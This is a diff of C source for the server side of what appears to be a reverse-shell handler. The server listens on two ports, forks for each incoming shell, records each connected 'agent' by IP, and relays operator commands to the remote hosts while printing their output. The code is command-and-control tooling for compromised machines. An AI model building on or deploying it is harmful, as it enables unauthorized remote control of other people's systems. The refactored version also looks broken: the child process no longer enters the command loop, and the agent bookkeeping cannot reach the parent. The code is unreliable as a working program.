@@ -5,14 +5,6 @@
 #include "resh.h"
 #include "srv.h"
 
-#define MAXSHELLS 500
-
-typedef struct {
-	char *ip;
-	int index;
-	int alive;
-} agent;
-
 int
 setupsock(int p)
 {
@@ -35,43 +27,31 @@ setupsock(int p)
 }
 
 void
-interact(int fd, agent *n)
+interact(int fd, Agents *n)
 {
-	char buf[8192];
-	char *cmd;
-	int cl; /* client, recieved from client */
-	int sb; /* sent bytes, holds send()'s return value */
+	int clr; /* client recieved */
+	char sbuf[2048], rbuf[8192];
 
-	while (1) {
-		printf("in while loop\n");
-		if ((cmd = fgets(cmd, sizeof(buf), stdin)))
+	while ((clr = recv(fd, rbuf, sizeof(rbuf), 0)) > 0) {
+		if (!(fgets(sbuf, sizeof(sbuf), stdin)))
 			die("Failed to read command\n");
-		if ((sb = send(fd, cmd, strlen(cmd), 0)) < 0) {
-			die("Failed to send command\n");
-		} else if (!sb) /* No bytes sent */
-			continue;
-
-		if((cl = recv(fd, &buf, sizeof(buf), 0)) < 0) {
-			die("Failed to read data\n");
-		} else if (!cl) { /* Connection closed by client*/
-			n->alive = 0;
-			die("Connection closed by: %s\n", n->ip);
-		} else {
-			rtrim(buf);
-			printf("%.*s", (int) strlen(buf), buf); /* To only print the recieved bytes */
-		}
+		if ((send(fd, sbuf, strlen(sbuf), 0)) < 0)
+			die("Failed to send data\n");
+		rtrim(rbuf);
+		printf("%.*s", (int) strlen(rbuf), rbuf);
 	}
+	n->alive = 0;
+	die("Connection closed: %s\n", n->ip);
 }
 
 void
-listener(unsigned p0, unsigned p1)
+listener(unsigned p0, unsigned p1, Agents *pa)
 {
-	int fd0, fd1, index = 0;
+	int fd0, fd1, i = 0;
 	pid_t pid;
 	fd0 = setupsock(p0);
 	fd1 = setupsock(p1);
 	printf("Now listening on port %d & %d\n", p0, p1);
-	agent agnts[MAXSHELLS]; /* Max amount of agents */
 
 	while(1) {
 		int sfd; /* session fd */
@@ -87,16 +67,16 @@ listener(unsigned p0, unsigned p1)
 		if ((pid = fork()) < 0)
 			die("Failed to create child process\n");
 		else if (!pid) { /* Child */
-			agnts[index].ip = inet_ntoa(inc_adr.sin_addr); /* setup struct for agent */
-			agnts[index].index = index;
-			agnts[index].alive = 1;
 			close(fd0); /* If child, kill the server fp and handle shell recieved */
 			close(fd1);
-
-			interact(sfd, &agnts[index]);
-			close(sfd);
+			 /* setup struct for agent */
+			pa->fp = sfd;
+			pa->ip = inet_ntoa(inc_adr.sin_addr);
+			pa->index = i;
+			pa->alive = 1;
+			pa++;
 		} else { /* Parent */
-			index++; /* Next agent gets next index */
+			i++; /* Next agent gets next index */
 			close(sfd); /* server doesn't need child fd */
 		}
 	}
